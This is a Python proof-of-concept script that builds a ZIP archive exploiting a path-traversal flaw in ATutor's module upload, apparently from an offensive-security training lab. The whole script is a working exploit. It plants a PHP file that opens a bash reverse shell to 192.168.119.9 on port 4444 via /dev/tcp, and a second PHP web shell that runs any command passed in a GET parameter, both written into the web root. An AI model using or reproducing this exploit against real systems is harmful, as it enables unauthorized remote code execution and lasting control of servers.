#!/usr/bin/python
import zipfile
import io
#from io import StringIO

def _build_zip():
    #f = StringIO()
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml',  str.encode('<?php phpinfo(); ?>'))
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml',  str.encode('<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/192.168.119.9/4444 0>&1\"\'); ?>'))
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/shell.phtml', str.encode('<?php system($_GET[\'cmd\']); ?>'))
    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()

